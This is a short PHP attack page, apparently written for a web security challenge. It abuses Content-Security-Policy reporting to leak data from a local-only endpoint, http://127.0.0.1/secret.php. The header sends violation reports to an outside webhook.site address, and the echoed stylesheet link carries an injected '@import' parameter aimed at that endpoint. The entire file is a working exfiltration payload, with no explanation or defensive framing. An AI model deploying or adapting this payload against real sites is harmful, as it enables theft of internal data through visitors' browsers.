<?php
header("Content-Security-Policy: style-src http://127.0.0.1/secret.php; report-uri https://webhook.site/8f452ad6-8c24-4930-82ea-bce7fa34b379;");
echo '<link rel="stylesheet" href="http://127.0.0.1/secret.php?whatUwant=@import \'">';
?>


